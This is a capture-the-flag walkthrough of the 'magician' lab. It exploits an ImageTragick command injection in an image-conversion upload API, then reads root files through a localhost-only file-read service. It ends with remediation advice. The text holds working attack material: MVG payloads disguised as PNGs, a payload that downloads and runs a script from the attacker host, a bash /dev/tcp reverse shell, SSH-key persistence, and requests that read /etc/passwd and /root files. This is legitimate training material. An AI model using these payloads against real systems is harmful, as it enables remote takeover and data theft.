# magician

This magical website lets you convert image file formats

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/magician.md

-------------------

## Overview

The target hosted an image-conversion web application, an FTP service, and a locally bound web service.

The attack path was:

1. Enumerate the exposed ports.
2. Log in anonymously to FTP and obtain an ImageTragick hint.
3. Inspect the frontend JavaScript.
4. Discover the backend upload API.
5. Confirm command execution through the image converter.
6. Obtain a reverse shell as the `magician` user.
7. Read the user flag.
8. Enumerate localhost-only services.
9. Discover an arbitrary file-read application.
10. Read and decode the root flag.

All flags, passwords, and direct challenge answers have been intentionally obfuscated.

---

## Environment

```text
AttackBox IP: 10.66.104.253
Target IP:    10.66.179.220
Hostname:     magician
```

Add the target hostname to `/etc/hosts`:

```bash
echo '10.66.179.220 magician' | sudo tee -a /etc/hosts
```

Verify that the hostname resolves:

```bash
getent hosts magician
```

---

## Port Scanning

Run a full TCP port scan with default scripts and service-version detection:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 \
  -oN nmap-sv-all.txt \
  10.66.179.220
```

The scan identified three exposed services:

```text
21/tcp    FTP
8080/tcp  HTTP backend API
8081/tcp  nginx web frontend
```

Port `8080` returned JSON-formatted HTTP errors, suggesting an application backend.

Port `8081` hosted a web application titled:

```text
magician
```

---

## FTP Enumeration

Connect to the FTP service:

```bash
ftp magician
```

Log in anonymously:

```text
Username: anonymous
Password: [REDACTED]
```

The server intentionally delayed the successful login and returned a useful hint relating to ImageMagick and ImageTragick.

The FTP server also disclosed the configuration option responsible for the login delay:

```text
delay_successful_login
```

Attempting to list files returned:

```text
550 Permission denied.
```

The FTP service therefore appeared to exist mainly to provide the initial vulnerability hint.

Exit FTP:

```text
quit
```

---

## Web Application Enumeration

Retrieve the frontend HTML:

```bash
curl -s http://magician:8081/ | tee magician.html
```

The application was a JavaScript frontend and referenced the following bundle:

```text
/js/app.2af72f5c.js
```

Download it:

```bash
curl -s \
  http://magician:8081/js/app.2af72f5c.js \
  -o app.js
```

Search the bundle for URLs, API paths, and image-related endpoints:

```bash
grep -Eo \
'https?://[^"[:space:]]+|/[A-Za-z0-9_?=&.-]*(upload|convert|image|file)[A-Za-z0-9_/?=&.-]*|8080' \
app.js |
sort -u
```

The JavaScript revealed:

```text
http://magician:8080
/upload
/files
```

This suggested the following API routes:

```text
POST /upload
GET  /files
```

---

## Confirming the Backend API

Request the files endpoint:

```bash
curl -i http://magician:8080/files
```

Initially, the response contained an empty JSON array:

```json
[]
```

Check the allowed methods for the upload endpoint:

```bash
curl -i -X OPTIONS http://magician:8080/upload
```

The server returned:

```text
Allow: POST,OPTIONS
```

This confirmed that `/upload` accepted POST requests.

---

## Capturing a Normal Upload

Open the frontend in a browser:

```text
http://magician:8081
```

Upload a harmless PNG image while intercepting the request with Burp Suite.

The request used a multipart form field named `file`:

```http
POST /upload HTTP/1.1
Host: magician:8080
Content-Type: multipart/form-data; boundary=...

Content-Disposition: form-data; name="file"; filename="example.png"
Content-Type: image/png
```

The backend returned a successful upload message:

```json
{
  "message": "Uploaded the file successfully: example.png"
}
```

The frontend then requested:

```http
GET /files HTTP/1.1
Host: magician:8080
```

The API showed that the uploaded PNG had been converted into a JPG:

```json
[
  {
    "name": "example.jpg",
    "url": "http://magician:8080/files/example.jpg"
  }
]
```

This confirmed that the backend passed uploaded images through an image-conversion process.

---

## Confirming ImageTragick Command Execution

Before attempting a reverse shell, confirm command execution with a harmless HTTP callback.

Start a web server on the AttackBox:

```bash
python3 -m http.server 8000
```

Create a malicious MVG payload disguised with a `.png` extension:

```bash
cat > callback.png <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com"|curl -m 3 http://10.66.104.253:8000/proof")'
pop graphic-context
EOF
```

Upload the payload:

```bash
curl -v --max-time 15 \
  -F 'file=@callback.png;filename=callback.png;type=image/png' \
  http://magician:8080/upload
```

The upload request may pause while the image converter processes the file.

The AttackBox HTTP server received a request from the target:

```text
10.66.179.220 - - "GET /proof HTTP/1.1" 404 -
```

The `404` response was expected because no file named `proof` existed.

The important result was that the target contacted the AttackBox, confirming remote command execution through the image-conversion process.

---

## Obtaining a Reverse Shell

Create a reverse-shell script on the AttackBox:

```bash
cat > shell.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.66.104.253/4444 0>&1
EOF
```

Keep the HTTP server running:

```bash
python3 -m http.server 8000
```

In another terminal, start a Netcat listener:

```bash
nc -lvnp 4444
```

Create a malicious upload that downloads and executes the shell script:

```bash
cat > shell.png <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com"|curl -s http://10.66.104.253:8000/shell.sh -o /tmp/shell.sh;bash /tmp/shell.sh")'
pop graphic-context
EOF
```

Upload it:

```bash
curl --max-time 10 \
  -F 'file=@shell.png;filename=shell.png;type=image/png' \
  http://magician:8080/upload
```

The listener received a connection:

```text
Connection received on 10.66.179.220
magician@magician:/tmp/hsperfdata_magician$
```

A foothold had been obtained as the `magician` user.

---

## Stabilising the Shell

Spawn a pseudo-terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

For a more complete shell, press:

```text
Ctrl+Z
```

Then, on the AttackBox:

```bash
stty raw -echo; fg
```

Press Enter and configure the terminal:

```bash
export TERM=xterm
stty rows 40 columns 120
```

Confirm the current user:

```bash
id
```

Output:

```text
uid=1000(magician) gid=1000(magician) groups=1000(magician)
```

---

## User Flag

Navigate to the user’s home directory:

```bash
cd /home/magician
ls -la
```

The directory contained:

```text
spring-boot-magician-backend-0.0.1-SNAPSHOT.jar
the_magic_continues
uploads
user.txt
```

Read the user flag:

```bash
cat user.txt
```

Output:

```text
THM{REDACTED_USER_FLAG}
```

The real flag has been intentionally omitted.

---

## Persistence Attempt

A public SSH key was added to:

```text
/home/magician/.ssh/authorized_keys
```

The `.ssh` directory and permissions were configured:

```bash
mkdir -p /home/magician/.ssh
chmod 700 /home/magician/.ssh
echo 'ATTACKBOX_PUBLIC_KEY' >> /home/magician/.ssh/authorized_keys
chmod 600 /home/magician/.ssh/authorized_keys
chown -R magician:magician /home/magician/.ssh
```

However, SSH access failed:

```text
ssh: connect to host magician port 22: Connection refused
```

The original scan had not identified port `22`, so there was no SSH service listening.

The reverse shell therefore remained the primary access method.

---

## Privilege-Escalation Enumeration

Inspect the clue file:

```bash
cat /home/magician/the_magic_continues
```

It stated that the magician kept a locally listening cat that acted as an oracle and revealed secrets.

The wording suggested:

```text
locally listening  → localhost-only service
cat                → Netcat or a service accessible using nc
oracle             → a service that returns information
secrets            → sensitive file contents
```

List listening TCP ports:

```bash
ss -lntp
```

The output included:

```text
127.0.0.1:6666
0.0.0.0:8081
*:8080
*:21
```

Port `6666` was bound only to localhost and had not appeared in the external Nmap scan.

---

## Enumerating the Local Service

Connect to the service with Netcat:

```bash
nc 127.0.0.1 6666
```

Typing commands such as `whoami`, `id`, or `help` did not produce useful output.

This suggested that the service was not a raw shell or line-based command service.

Send an HTTP request instead:

```bash
printf 'GET / HTTP/1.0\r\n\r\n' |
timeout 5 nc 127.0.0.1 6666 |
xxd
```

The response began with:

```text
HTTP/1.0 200 OK
Server: gunicorn/20.0.4
Content-Type: text/html; charset=utf-8
```

The page title was:

```text
The Magic cat
```

The HTML contained a POST form with a field named `filename`:

```html
<form action="" method="post">
  <input
    class="form-control"
    id="filename"
    name="filename"
    type="text"
    value=""
  >

  <input
    class="btn btn-default"
    id="submit"
    name="submit"
    type="submit"
    value="Submit"
  >
</form>
```

This indicated that the service accepted a filename and returned information about the requested file.

---

## Testing Arbitrary File Read

Test the service with a harmless system file:

```bash
curl -s -X POST \
  --data-urlencode 'filename=/etc/passwd' \
  http://127.0.0.1:6666/
```

The application returned the requested file contents encoded in Base64.

This confirmed an arbitrary file-read vulnerability.

---

## Reading the Root Flag

Request the root flag:

```bash
curl -s -X POST \
  --data-urlencode 'filename=/root/root.txt' \
  http://127.0.0.1:6666/
```

The returned HTML contained a Base64 value:

```text
[REDACTED_BASE64_ROOT_FLAG]
```

Decode the value:

```bash
echo '[BASE64_VALUE_RETURNED_BY_TARGET]' | base64 -d
```

Output:

```text
THM{REDACTED_ROOT_FLAG}
```

The real flag and its encoded form have both been intentionally omitted.

---

## Attack Summary

The complete attack path was:

```text
Full TCP port scan
        ↓
Anonymous FTP login
        ↓
ImageTragick hint
        ↓
Frontend JavaScript enumeration
        ↓
Discovery of POST /upload and GET /files
        ↓
Normal PNG upload and JPG conversion
        ↓
Malicious MVG content disguised as PNG
        ↓
HTTP callback confirms command execution
        ↓
Reverse shell as magician
        ↓
User flag
        ↓
Clue file points to localhost service
        ↓
127.0.0.1:6666 identified
        ↓
Gunicorn HTTP application discovered
        ↓
filename POST parameter
        ↓
Arbitrary file read
        ↓
Root flag returned in Base64
        ↓
Base64 decoding
```

---

## Key Commands

### Add the hostname

```bash
echo '10.66.179.220 magician' | sudo tee -a /etc/hosts
```

### Full port scan

```bash
sudo nmap -sV -sC -p- --min-rate 5000 \
  -oN nmap-sv-all.txt \
  10.66.179.220
```

### Download frontend JavaScript

```bash
curl -s \
  http://magician:8081/js/app.2af72f5c.js \
  -o app.js
```

### Search for API routes

```bash
grep -Eo \
'https?://[^"[:space:]]+|/[A-Za-z0-9_?=&.-]*(upload|convert|image|file)[A-Za-z0-9_/?=&.-]*|8080' \
app.js |
sort -u
```

### Enumerate uploaded files

```bash
curl -s http://magician:8080/files
```

### Upload a file

```bash
curl -F \
  'file=@example.png;filename=example.png;type=image/png' \
  http://magician:8080/upload
```

### Start an HTTP server

```bash
python3 -m http.server 8000
```

### Start a reverse-shell listener

```bash
nc -lvnp 4444
```

### Stabilise the shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Enumerate local listeners

```bash
ss -lntp
```

### Probe the local HTTP service

```bash
printf 'GET / HTTP/1.0\r\n\r\n' |
timeout 5 nc 127.0.0.1 6666
```

### Request a file from the oracle

```bash
curl -s -X POST \
  --data-urlencode 'filename=/path/to/file' \
  http://127.0.0.1:6666/
```

### Decode Base64

```bash
echo '[BASE64_VALUE]' | base64 -d
```

## Remediation

The identified weaknesses could be remediated by:

1. Upgrading ImageMagick to a patched release.
2. Disabling unsafe ImageMagick coders and delegates.
3. Validating uploaded files based on actual file content rather than extension or MIME type.
4. Running image conversion inside a sandboxed, unprivileged container.
5. Blocking outbound network access from image-processing workers.
6. Avoiding shell invocation during image processing.
7. Restricting internal file-reading services to an explicit allowlist.
8. Running the local oracle as an unprivileged account.
9. Preventing application services from reading files under `/root`.
10. Removing unnecessary FTP access and information-disclosure hints.
11. Applying strict file-system permissions and application-level access controls.
